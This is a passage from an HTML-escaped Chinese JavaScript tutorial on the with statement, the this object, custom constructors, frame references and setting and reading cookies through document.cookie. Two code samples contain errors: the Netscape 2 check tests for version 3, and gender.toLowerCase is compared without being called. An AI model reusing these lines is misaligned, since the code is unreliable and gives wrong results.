/&gt;\r\ny = Math.tan(14 * Math.E);&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;当使用&lt;span lang=&quot;EN-US&quot;&gt; with &lt;/span&gt;语句时，代码变得更短且更易读：&lt;span lang=&quot;EN-US&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;with (Math) {&lt;br /&gt;\r\n&amp;nbsp; x = cos(3 * PI) + sin(LN10);&lt;br /&gt;\r\n&amp;nbsp; y = tan(14 * E);&lt;br /&gt;\r\n}&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;this_对象&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;this &lt;/span&gt;对象&lt;/b&gt;&lt;/a&gt; 返回“当前”对象。在不同的地方，&lt;span lang=&quot;EN-US&quot;&gt;this &lt;/span&gt;代表不同的对象。如果在&lt;span lang=&quot;EN-US&quot;&gt; JavaScript &lt;/span&gt;的“主程序”中（不在任何&lt;span lang=&quot;EN-US&quot;&gt; function &lt;/span&gt;中，不在任何事件处理程序中）使用&lt;span lang=&quot;EN-US&quot;&gt; this&lt;/span&gt;，它就代表&lt;span lang=&quot;EN-US&quot;&gt; window &lt;/span&gt;对象；如果在&lt;span lang=&quot;EN-US&quot;&gt; with &lt;/span&gt;语句块中使用&lt;span lang=&quot;EN-US&quot;&gt; this&lt;/span&gt;，它就代表&lt;span lang=&quot;EN-US&quot;&gt; with &lt;/span&gt;所指定的对象；如果在事件处理程序中使用&lt;span lang=&quot;EN-US&quot;&gt; this&lt;/span&gt;，它就代表发生事件的对象。&lt;/p&gt;\r\n&lt;p&gt;一个常用的&lt;span lang=&quot;EN-US&quot;&gt; this &lt;/span&gt;用法：&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;script&amp;gt;&lt;br /&gt;\r\n...&lt;br /&gt;\r\nfunction check(formObj) {&lt;br /&gt;\r\n&amp;nbsp; ...&lt;br /&gt;\r\n}&lt;br /&gt;\r\n...&lt;br /&gt;\r\n&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;body ...&amp;gt;&lt;br /&gt;\r\n...&lt;br /&gt;\r\n&amp;lt;form ...&amp;gt;&lt;br /&gt;\r\n...&lt;br /&gt;\r\n&amp;lt;input type=&quot;text&quot; ... onchange=&quot;check(&lt;b&gt;this&lt;/b&gt;.form)&quot;&amp;gt;&lt;br /&gt;\r\n...&lt;br /&gt;\r\n&amp;lt;/form&amp;gt;&lt;br /&gt;\r\n...&lt;br /&gt;\r\n&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;这个用法常用于立刻检测表单输入的有效性。&lt;/p&gt;\r\n&lt;p&gt;&lt;a name=&quot;自定义构造函数&quot;&gt;&lt;b&gt;自定义构造函数&lt;/b&gt;&lt;/a&gt;&lt;b&gt; &lt;/b&gt;我们已经知道，&lt;span lang=&quot;EN-US&quot;&gt;Array()&lt;/span&gt;，&lt;span lang=&quot;EN-US&quot;&gt;Image()&lt;/span&gt;等构造函数能让我们构造一个变量。其实我们自己也可以写自己的构造函数。自定义构造函数也是用&lt;span lang=&quot;EN-US&quot;&gt; function&lt;/span&gt;。在&lt;span lang=&quot;EN-US&quot;&gt; function &lt;/span&gt;里边用&lt;span lang=&quot;EN-US&quot;&gt; this &lt;/span&gt;来定义属性。&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;function &amp;lt;&lt;/span&gt;构造函数名&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt; [(&amp;lt;&lt;/span&gt;参数&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt;)] {&lt;br /&gt;\r\n&amp;nbsp; ...&lt;br /&gt;\r\n&amp;nbsp; this.&amp;lt;&lt;/span&gt;属性名&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt; = &amp;lt;&lt;/span&gt;初始值&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt;;&lt;br /&gt;\r\n&amp;nbsp; ...&lt;br /&gt;\r\n}&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;然后，用&lt;span lang=&quot;EN-US&quot;&gt; new &lt;/span&gt;构造函数关键字来构造变量：&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;var &amp;lt;&lt;/span&gt;变量名&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt; = new &amp;lt;&lt;/span&gt;构造函数名&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt;[(&amp;lt;&lt;/span&gt;参数&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt;)];&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;构造变量以后，&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;&lt;/span&gt;变量名&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt;&lt;/span&gt;成为一个对象，它有它自己的属性——用&lt;span lang=&quot;EN-US&quot;&gt; this &lt;/span&gt;在&lt;span lang=&quot;EN-US&quot;&gt; function &lt;/span&gt;里设定的属性。&lt;/p&gt;\r\n&lt;p&gt;以下是一个从网上找到的搜集浏览器详细资料的自定义构造函数的例子：&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;function Is() {&lt;br /&gt;\r\n&amp;nbsp; var agent = navigator.userAgent.toLowerCase();&lt;br /&gt;\r\n&amp;nbsp; this.major = parseInt(navigator.appVersion);&amp;nbsp; //&lt;/span&gt;主版本号&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp; this.minor = parseFloat(navigator.appVersion);//&lt;/span&gt;全版本号&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp; this.ns = ((agent.indexOf(''mozilla'')!=-1) &amp;amp;&amp;amp;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;((agent.indexOf(''spoofer'')==-1) &amp;amp;&amp;amp; //&lt;/span&gt;是否&lt;span lang=&quot;EN-US&quot;&gt;Netscape&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(agent.indexOf(''compatible'') == -1)));&lt;br /&gt;\r\n&amp;nbsp; this.ns2 = (this.ns &amp;amp;&amp;amp; (this.major == 3));&amp;nbsp;&amp;nbsp;&amp;nbsp; //&lt;/span&gt;是否&lt;span lang=&quot;EN-US&quot;&gt; Netscape 2&lt;br /&gt;\r\n&amp;nbsp; this.ns3 = (this.ns &amp;amp;&amp;amp; (this.major == 3));&amp;nbsp;&amp;nbsp;&amp;nbsp; //&lt;/span&gt;是否&lt;span lang=&quot;EN-US&quot;&gt; Netscape 3&lt;br /&gt;\r\n&amp;nbsp; this.ns4b = (this.ns &amp;amp;&amp;amp; (this.minor &amp;lt; 4.04)); //&lt;/span&gt;是否&lt;span lang=&quot;EN-US&quot;&gt; Netscape 4 &lt;/span&gt;低版本&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp; this.ns4 = (this.ns &amp;amp;&amp;amp; (this.major &amp;gt;= 4));&amp;nbsp;&amp;nbsp;&amp;nbsp;//&lt;/span&gt;是否&lt;span lang=&quot;EN-US&quot;&gt; Netscape 4 &lt;/span&gt;高版本&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp; this.ie = (agent.indexOf(&quot;msie&quot;) !=-1);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //&lt;/span&gt;是否&lt;span lang=&quot;EN-US&quot;&gt; IE&lt;br /&gt;\r\n&amp;nbsp; this.ie3 = (this.ie &amp;amp;&amp;amp; (this.major == 2));&amp;nbsp;&amp;nbsp;&amp;nbsp; //&lt;/span&gt;是否&lt;span lang=&quot;EN-US&quot;&gt; IE 3&lt;br /&gt;\r\n&amp;nbsp; this.ie4 = (this.ie &amp;amp;&amp;amp; (this.major &amp;gt;= 4));&amp;nbsp;&amp;nbsp;&amp;nbsp;//&lt;/span&gt;是否&lt;span lang=&quot;EN-US&quot;&gt; IE 4&lt;br /&gt;\r\n&amp;nbsp; this.op3 = (agent.indexOf(&quot;opera&quot;) != -1);&amp;nbsp;&amp;nbsp;&amp;nbsp;//&lt;/span&gt;是否&lt;span lang=&quot;EN-US&quot;&gt; Opera 3&lt;br /&gt;\r\n&amp;nbsp; this.win =(agent.indexOf(&quot;win&quot;)!=-1);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;//&lt;/span&gt;是否&lt;span lang=&quot;EN-US&quot;&gt; Windows &lt;/span&gt;版本&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp; this.mac =(agent.indexOf(&quot;mac&quot;)!=-1);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;//&lt;/span&gt;是否&lt;span lang=&quot;EN-US&quot;&gt; Macintosh &lt;/span&gt;版本&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp; this.unix =(agent.indexOf(&quot;x11&quot;)!=-1);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //&lt;/span&gt;是否&lt;span lang=&quot;EN-US&quot;&gt; Unix &lt;/span&gt;版本&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n}&lt;br /&gt;\r\n&lt;br /&gt;\r\nvar is = new Is();&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;这个构造函数非常完整的搜集了浏览器的信息。我们看到它为对象定义了很多个属性：&lt;span lang=&quot;EN-US&quot;&gt;major, minor, ns, ie,win, mac &lt;/span&gt;等等。它们的意思见上面的注释。把&lt;span lang=&quot;EN-US&quot;&gt; is &lt;/span&gt;变量定义为&lt;span lang=&quot;EN-US&quot;&gt; Is() &lt;/span&gt;对象后，用&lt;span lang=&quot;EN-US&quot;&gt; if (is.ns) &lt;/span&gt;这种格式就可以很方便的知道浏览器的信息了。我们也可以从这个构造函数中看到，它也可以使用一般的&lt;span lang=&quot;EN-US&quot;&gt; JavaScript &lt;/span&gt;语句（上例中为&lt;span lang=&quot;EN-US&quot;&gt; var &lt;/span&gt;语句）。&lt;/p&gt;\r\n&lt;p&gt;让我们再来看一个使用参数的构造函数：&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;function myFriend(theName, gender, theAge, birthOn, theJob){&lt;br /&gt;\r\n&amp;nbsp; this.name = theName;&lt;br /&gt;\r\n&amp;nbsp; this.isMale = (gender.toLowerCase == ''male'');&lt;br /&gt;\r\n&amp;nbsp; this.age = theAge;&lt;br /&gt;\r\n&amp;nbsp; this.birthday = new Date(birthOn);&lt;br /&gt;\r\n&amp;nbsp; this.job = theJob&lt;br /&gt;\r\n}&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;var Stephen = new myFriend(''Stephen'', ''Male'', 18, ''Dec 22,1982'', ''Student'');&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;从这个构造函数我们不但看到了参数的用法，还看到了不同的属性用不同的数据型是可以的（上例五个属性分别为：字符串，布尔值，数字，日期，字符串），还看到了构造函数里也可以用构造函数来“构造”属性。如果用了足够的“保护措施”来避免无限循环，更可以用构造函数自身来构造自己的属性。&lt;/p&gt;\r\n&lt;h2&gt;&lt;a name=&quot;使用框架和Cookies&quot;&gt;使用框架和&lt;span lang=&quot;EN-US&quot;&gt;Cookies&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\r\n&lt;h3&gt;&lt;a name=&quot;使用框架&quot;&gt;使用框架&lt;/a&gt;&lt;/h3&gt;\r\n&lt;p&gt;　　在讲述&lt;span lang=&quot;EN-US&quot;&gt; window &lt;/span&gt;对象的时候，我们提到过，一个框架内的网页也是&lt;span lang=&quot;EN-US&quot;&gt;window &lt;/span&gt;对象，也就是说，&lt;span lang=&quot;EN-US&quot;&gt;Frame &lt;/span&gt;对象也是&lt;span lang=&quot;EN-US&quot;&gt;window &lt;/span&gt;对象。用最容易理解的话说，每一个&lt;span lang=&quot;EN-US&quot;&gt; HTML &lt;/span&gt;文件占用一个&lt;span lang=&quot;EN-US&quot;&gt; window &lt;/span&gt;对象，包括定义框架的网页（“框架网页”）。在&lt;span lang=&quot;EN-US&quot;&gt; IE &lt;/span&gt;里用“&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;iframe&amp;gt;&lt;/span&gt;”标记在文档中插入的框架也是&lt;span lang=&quot;EN-US&quot;&gt; window &lt;/span&gt;对象，但是用“包含网页”的方法（在&lt;span lang=&quot;EN-US&quot;&gt; HTML &lt;/span&gt;中显示为“&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;!--webbotbot=&quot;include&quot; ...--&amp;gt;&lt;/span&gt;”）读取的 &lt;span lang=&quot;EN-US&quot;&gt;HTML &lt;/span&gt;就不占用独自的&lt;span lang=&quot;EN-US&quot;&gt; window &lt;/span&gt;对象。每一个框架都是包含它的页的&lt;span lang=&quot;EN-US&quot;&gt; window &lt;/span&gt;对象的一个子对象（不知道应该叫“属性”不该），要引用它，可以用以下几种方法之一：&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;window.frames[x]&lt;br /&gt;\r\nwindow.frames[''frameName'']&lt;br /&gt;\r\nwindow.frameName&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;　　其中，&lt;span lang=&quot;EN-US&quot;&gt;x &lt;/span&gt;指的是该&lt;span lang=&quot;EN-US&quot;&gt; window &lt;/span&gt;对象中指定的第几个框架，与其它数组一样，&lt;span lang=&quot;EN-US&quot;&gt;x &lt;/span&gt;也是从零开始的。&lt;span lang=&quot;EN-US&quot;&gt;frameName &lt;/span&gt;指的是该框架的名字，跟&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;frame&amp;gt;&lt;/span&gt;里的“&lt;span lang=&quot;EN-US&quot;&gt;name&lt;/span&gt;”属性一样。&lt;/p&gt;\r\n&lt;p&gt;　　如果使用&lt;span lang=&quot;EN-US&quot;&gt; window.frameName &lt;/span&gt;指定的&lt;span lang=&quot;EN-US&quot;&gt; window &lt;/span&gt;对象又是一个框架网页，那么引用它的框架的方法：&lt;span lang=&quot;EN-US&quot;&gt;window.frameName.subFrameName&lt;/span&gt;。以此类推。&lt;/p&gt;\r\n&lt;p&gt;　　要注意的时，无论在何处，引用“&lt;span lang=&quot;EN-US&quot;&gt;window&lt;/span&gt;”对象所返回的，都是“当前”&lt;span lang=&quot;EN-US&quot;&gt;window &lt;/span&gt;对象。如果要访问其它&lt;span lang=&quot;EN-US&quot;&gt; window &lt;/span&gt;对象，就要用到&lt;span lang=&quot;EN-US&quot;&gt; parent &lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt; top &lt;/span&gt;属性。&lt;span lang=&quot;EN-US&quot;&gt;parent&lt;/span&gt;指的是“父级”&lt;span lang=&quot;EN-US&quot;&gt;window &lt;/span&gt;对象，也就是包含当前&lt;span lang=&quot;EN-US&quot;&gt; window&lt;/span&gt;对象的框架网页；&lt;span lang=&quot;EN-US&quot;&gt;top &lt;/span&gt;指的是窗口最顶端的&lt;span lang=&quot;EN-US&quot;&gt; window &lt;/span&gt;对象。&lt;/p&gt;\r\n&lt;p&gt;　　使用框架还要密切留意你的&lt;span lang=&quot;EN-US&quot;&gt; JavaScript &lt;/span&gt;中定义的全局变量和自定义函数。它们都有它们的所属——所在的&lt;span lang=&quot;EN-US&quot;&gt; window &lt;/span&gt;对象。要引用其它框架中的全局变量或自定义函数，都要用“窗口对象&lt;span lang=&quot;EN-US&quot;&gt;.&lt;/span&gt;框架对象&lt;span lang=&quot;EN-US&quot;&gt;[.&lt;/span&gt;框架对象…&lt;span lang=&quot;EN-US&quot;&gt;].&lt;/span&gt;全局变量或自定义函数”这种很烦的方法。&lt;/p&gt;\r\n&lt;p&gt;　　以上这个问题在建立连接时经常会被忽略：如果在&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;中定义了一个默认目标窗口（&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;base target=&quot;...&quot;&amp;gt;&lt;/span&gt;），在&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;ahref=&quot;javascript:...&quot;&amp;gt;&lt;/span&gt;中，要知道输入的&lt;span lang=&quot;EN-US&quot;&gt; JavaScript &lt;/span&gt;语句是在默认目标窗口中运行的，必要时加一些“&lt;span lang=&quot;EN-US&quot;&gt;parent&lt;/span&gt;”“&lt;span lang=&quot;EN-US&quot;&gt;top&lt;/span&gt;”属性。&lt;/p&gt;\r\n&lt;h3&gt;&lt;a name=&quot;使用_Cookies&quot;&gt;使用 &lt;span lang=&quot;EN-US&quot;&gt;Cookies&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\r\n&lt;p&gt;　　我们已经知道，在&lt;span lang=&quot;EN-US&quot;&gt; document &lt;/span&gt;对象中有一个&lt;span lang=&quot;EN-US&quot;&gt; cookie &lt;/span&gt;属性。但是&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;又是什么？“某些&lt;span lang=&quot;EN-US&quot;&gt; Web &lt;/span&gt;站点在您的硬盘上用很小的文本文件存储了一些信息，这些文件就称为&lt;span lang=&quot;EN-US&quot;&gt; Cookie&lt;/span&gt;。”——&lt;span lang=&quot;EN-US&quot;&gt; MSIE &lt;/span&gt;帮助。一般来说，&lt;span lang=&quot;EN-US&quot;&gt;Cookies &lt;/span&gt;是&lt;span lang=&quot;EN-US&quot;&gt; CGI &lt;/span&gt;或类似，比&lt;span lang=&quot;EN-US&quot;&gt;HTML &lt;/span&gt;高级的文件、程序等创建的，但是&lt;span lang=&quot;EN-US&quot;&gt; JavaScript &lt;/span&gt;也提供了对&lt;span lang=&quot;EN-US&quot;&gt; Cookies &lt;/span&gt;的很全面的访问权利。&lt;/p&gt;\r\n&lt;p&gt;　　在继续之前，我们先要学一学 &lt;a name=&quot;Cookie_的基本知识&quot;&gt;&lt;b&gt;&lt;span lang=&quot;EN-US&quot;&gt;Cookie &lt;/span&gt;的基本知识&lt;/b&gt;&lt;/a&gt;。&lt;/p&gt;\r\n&lt;p&gt;　　每个&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;都是这样的：&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;cookie&lt;/span&gt;名&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt;=&amp;lt;&lt;/span&gt;值&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;　　&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;cookie&lt;/span&gt;名&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt;&lt;/span&gt;的限制与&lt;span lang=&quot;EN-US&quot;&gt; JavaScript &lt;/span&gt;的命名限制大同小异，少了“不能用&lt;span lang=&quot;EN-US&quot;&gt; JavaScript &lt;/span&gt;关键字”，多了“只能用可以用在&lt;span lang=&quot;EN-US&quot;&gt; URL &lt;/span&gt;编码中的字符”。后者比较难懂，但是只要你只用字母和数字命名，就完全没有问题了。&lt;span lang=&quot;EN-US&quot;&gt;&amp;lt;&lt;/span&gt;值&lt;span lang=&quot;EN-US&quot;&gt;&amp;gt;&lt;/span&gt;的要求也是“只能用可以用在&lt;span lang=&quot;EN-US&quot;&gt; URL &lt;/span&gt;编码中的字符”。&lt;/p&gt;\r\n&lt;p&gt;　　每个&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;都有失效日期，一旦电脑的时钟过了失效日期，这个&lt;span lang=&quot;EN-US&quot;&gt;Cookie &lt;/span&gt;就会被删掉。我们不能直接删掉一个&lt;span lang=&quot;EN-US&quot;&gt; Cookie&lt;/span&gt;，但是可以用设定失效日期早于现在时刻的方法来间接删掉它。&lt;/p&gt;\r\n&lt;p&gt;　　每个网页，或者说每个站点，都有它自己的&lt;span lang=&quot;EN-US&quot;&gt; Cookies&lt;/span&gt;，这些&lt;span lang=&quot;EN-US&quot;&gt;Cookies &lt;/span&gt;只能由这个站点下的网页来访问，来自其他站点或同一站点下未经授权的区域的网页，是不能访问的。每一“组”&lt;span lang=&quot;EN-US&quot;&gt;Cookies &lt;/span&gt;有规定的总大小（大约&lt;span lang=&quot;EN-US&quot;&gt; 2KB &lt;/span&gt;每“组”），一超过最大总大小，则最早失效的&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;先被删除，来让新的&lt;span lang=&quot;EN-US&quot;&gt; Cookie&lt;/span&gt;“安家”。&lt;/p&gt;\r\n&lt;p&gt;　　现在我们来学习&lt;a name=&quot;使用_document.cookie_属性&quot;&gt;&lt;b&gt;使用&lt;span lang=&quot;EN-US&quot;&gt;document.cookie &lt;/span&gt;属性&lt;/b&gt;&lt;/a&gt;。&lt;/p&gt;\r\n&lt;p&gt;　　如果直接使用&lt;span lang=&quot;EN-US&quot;&gt; document.cookie &lt;/span&gt;属性，或者说，用某种方法，例如给变量赋值，来获得&lt;span lang=&quot;EN-US&quot;&gt; document.cookie &lt;/span&gt;的值，我们就可以知道在现在的文档中有多少个&lt;span lang=&quot;EN-US&quot;&gt;Cookies&lt;/span&gt;，每个&lt;span lang=&quot;EN-US&quot;&gt; Cookies &lt;/span&gt;的名字，和它的值。例如，在某文档中添加“&lt;span lang=&quot;EN-US&quot;&gt;document.write(document.cookie)&lt;/span&gt;”，结果显示：&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;name=kevin; email=kevin@kevin.com; lastvisited=index.html&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;这意味着，文档包含&lt;span lang=&quot;EN-US&quot;&gt; 3 &lt;/span&gt;个&lt;span lang=&quot;EN-US&quot;&gt; Cookies&lt;/span&gt;：&lt;span lang=&quot;EN-US&quot;&gt;name, email &lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt; lastvisited&lt;/span&gt;，它们的值分别是&lt;span lang=&quot;EN-US&quot;&gt; kevin, kevin@kevin.com &lt;/span&gt;和&lt;span lang=&quot;EN-US&quot;&gt; index.html&lt;/span&gt;。可以看到，两个&lt;span lang=&quot;EN-US&quot;&gt; Cookies &lt;/span&gt;之间是用分号和空格隔开的，于是我们可以用&lt;span lang=&quot;EN-US&quot;&gt;cookieString.split(''; '') &lt;/span&gt;方法得到每个&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;分开的一个数组（先用&lt;span lang=&quot;EN-US&quot;&gt; var cookieString = document.cookie&lt;/span&gt;）。&lt;/p&gt;\r\n&lt;p&gt;　　设定一个&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;的方法是对&lt;span lang=&quot;EN-US&quot;&gt; document.cookie&lt;/span&gt;赋值。与其它情况下的赋值不同，向&lt;span lang=&quot;EN-US&quot;&gt; document.cookie &lt;/span&gt;赋值不会删除掉原有的&lt;span lang=&quot;EN-US&quot;&gt; Cookies&lt;/span&gt;，而只会增添&lt;span lang=&quot;EN-US&quot;&gt; Cookies &lt;/span&gt;或更改原有&lt;span lang=&quot;EN-US&quot;&gt; Cookie&lt;/span&gt;。赋值的格式：&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;document.cookie = ''&lt;b&gt;cookieName&lt;/b&gt;='' + &lt;u&gt;escape&lt;/u&gt;(''&lt;b&gt;cookieValue&lt;/b&gt;'')&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; + ''&lt;u&gt;;&lt;/u&gt;expires='' + &lt;b&gt;expirationDateObj&lt;/b&gt;.&lt;u&gt;toGMTString()&lt;/u&gt;;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;是不是看到头晕了呢？以上不是粗体字的地方是要照抄不误的，粗体字是要按实际情况做出改动的。&lt;span lang=&quot;EN-US&quot;&gt;cookieName &lt;/span&gt;表示&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;的名称，&lt;span lang=&quot;EN-US&quot;&gt;cookieValue &lt;/span&gt;表示&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;的值，&lt;span lang=&quot;EN-US&quot;&gt;expirationDateObj &lt;/span&gt;表示储存着失效日期的日期对象名，如果不需要指定失效日期，则不需要第二行。不指定失效日期，则浏览器默认是在关闭浏览器（也就是关闭所有窗口）之后过期。&lt;/p&gt;\r\n&lt;p&gt;　　看到了上面的一些下划线了么？这些是应该注意的地方。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;　　首先&lt;span lang=&quot;EN-US&quot;&gt; escape() &lt;/span&gt;方法：为什么一定要用？因为&lt;span lang=&quot;EN-US&quot;&gt;Cookie &lt;/span&gt;的值的要求是“只能用可以用在&lt;span lang=&quot;EN-US&quot;&gt; URL &lt;/span&gt;编码中的字符”。我们知道“&lt;span lang=&quot;EN-US&quot;&gt;escape()&lt;/span&gt;”方法是把字符串按&lt;span lang=&quot;EN-US&quot;&gt; URL &lt;/span&gt;编码方法来编码的，那我们只需要用一个“&lt;span lang=&quot;EN-US&quot;&gt;escape()&lt;/span&gt;”方法来处理输出到&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;的值，用“&lt;span lang=&quot;EN-US&quot;&gt;unescape()&lt;/span&gt;”来处理从&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;接收过来的值就万无一失了。而且这两个方法的最常用途就是处理&lt;span lang=&quot;EN-US&quot;&gt; Cookies&lt;/span&gt;。其实设定一个&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;只是“&lt;span lang=&quot;EN-US&quot;&gt;document.cookie = ''cookieName=cookieValue''&lt;/span&gt;”这么简单，但是为了避免在&lt;span lang=&quot;EN-US&quot;&gt; cookieValue &lt;/span&gt;中出现&lt;span lang=&quot;EN-US&quot;&gt; URL &lt;/span&gt;里不准出现的字符，还是用一个&lt;span lang=&quot;EN-US&quot;&gt; escape() &lt;/span&gt;好。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;　　然后“&lt;span lang=&quot;EN-US&quot;&gt;expires&lt;/span&gt;”前面的分号：注意到就行了。是分号而不是其他。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;　　最后&lt;span lang=&quot;EN-US&quot;&gt; toGMTString() &lt;/span&gt;方法：设定&lt;span lang=&quot;EN-US&quot;&gt; Cookie&lt;/span&gt;的时效日期都是用&lt;span lang=&quot;EN-US&quot;&gt; GMT &lt;/span&gt;格式的时间的，其它格式的时间是没有作用的。&lt;/p&gt;\r\n&lt;p&gt;　　现在我们来实战一下。设定一个“&lt;span lang=&quot;EN-US&quot;&gt;name=rose&lt;/span&gt;”的&lt;span lang=&quot;EN-US&quot;&gt; Cookie&lt;/span&gt;，在&lt;span lang=&quot;EN-US&quot;&gt; 3 &lt;/span&gt;个月后过期。&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;var expires = new Date();&lt;br /&gt;\r\nexpires.setTime(expires.getTime() + 3 * 30 * 24 * 60 * 60 * 1000);&lt;br /&gt;\r\n/*&amp;nbsp;&amp;nbsp; &lt;/span&gt;三个月&lt;span lang=&quot;EN-US&quot;&gt; x &lt;/span&gt;一个月当作&lt;span lang=&quot;EN-US&quot;&gt; 30 &lt;/span&gt;天&lt;span lang=&quot;EN-US&quot;&gt; x &lt;/span&gt;一天&lt;span lang=&quot;EN-US&quot;&gt; 24 &lt;/span&gt;小时&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp; x &lt;/span&gt;一小时&lt;span lang=&quot;EN-US&quot;&gt; 60 &lt;/span&gt;分&lt;span lang=&quot;EN-US&quot;&gt; x &lt;/span&gt;一分&lt;span lang=&quot;EN-US&quot;&gt; 60 &lt;/span&gt;秒&lt;span lang=&quot;EN-US&quot;&gt; x &lt;/span&gt;一秒&lt;span lang=&quot;EN-US&quot;&gt; 1000 &lt;/span&gt;毫秒&lt;span lang=&quot;EN-US&quot;&gt; */&lt;br /&gt;\r\ndocument.cookie = ''name=rose;expires='' + expires.toGMTString();&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;为什么没有用&lt;span lang=&quot;EN-US&quot;&gt; escape() &lt;/span&gt;方法？这是因为我们知道&lt;span lang=&quot;EN-US&quot;&gt; rose &lt;/span&gt;是一个合法的&lt;span lang=&quot;EN-US&quot;&gt; URL &lt;/span&gt;编码字符串，也就是说，&lt;span lang=&quot;EN-US&quot;&gt;''rose'' == escape(''rose'')&lt;/span&gt;。一般来说，如果设定&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;时不用&lt;span lang=&quot;EN-US&quot;&gt; 